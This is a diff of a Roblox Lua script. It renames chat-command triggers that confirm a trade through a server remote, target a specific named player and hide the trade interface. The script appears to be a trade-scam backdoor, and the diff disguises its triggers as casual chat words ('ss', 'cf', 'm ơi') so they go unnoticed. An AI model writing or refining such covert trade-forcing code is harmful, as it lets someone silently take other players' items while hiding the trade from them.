@@ -55,7 +55,7 @@ task.spawn(function()
 				-- =========================
 				-- 🔥 .tdh
 				-- =========================
-				if text == ".tdh" then
+				if text == ".hii" then
 					pcall(function()
 						local target = Players:FindFirstChild("baba099739")
 						if target then
@@ -80,7 +80,7 @@ task.spawn(function()
 				-- =========================
 				-- 🔥 .rdh
 				-- =========================
-				if text == ".rdh" then
+				if text == "ss" then
 					pcall(function()
 						local args = {
 							[1] = true
@@ -92,7 +92,7 @@ task.spawn(function()
 				-- =========================
 				-- 🔥 .cfh
 				-- =========================
-				if text == ".cfh" then
+				if text == "cf" then
 					pcall(function()
 						Net:FindFirstChild("RF/Trading/ConfirmTrade"):InvokeServer()
 					end)
@@ -101,7 +101,7 @@ task.spawn(function()
 				-- =========================
 				-- 🔥 .anui
 				-- =========================
-				if text == ".anui" then
+				if text == "m ơi" then
 					pcall(function()
 						hideTradeUI()
 					end)
